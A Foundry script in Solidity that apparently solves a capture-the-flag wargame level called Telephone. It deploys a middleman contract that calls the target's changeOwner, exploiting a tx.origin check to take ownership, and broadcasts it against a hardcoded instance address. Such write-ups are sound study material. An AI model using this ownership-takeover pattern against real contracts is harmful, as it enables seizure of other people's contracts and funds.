// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Telephone} from "../src/Telephone.sol";

contract TelephoneAttack {
    Telephone public target;

    constructor (address targetAddrs) {
        target = Telephone (targetAddrs);
    }

    function attack(address new_owner) external {
        target.changeOwner(new_owner);
    }
}
contract TelephoneSolution is Script {
    function run() external {
        address inst = 0x09839E00268eAda32dAC5A439fC5790e10b48701;
        vm.startBroadcast();

        TelephoneAttack phone = new TelephoneAttack(inst);
        phone.attack(msg.sender);
        vm.stopBroadcast();

    }
}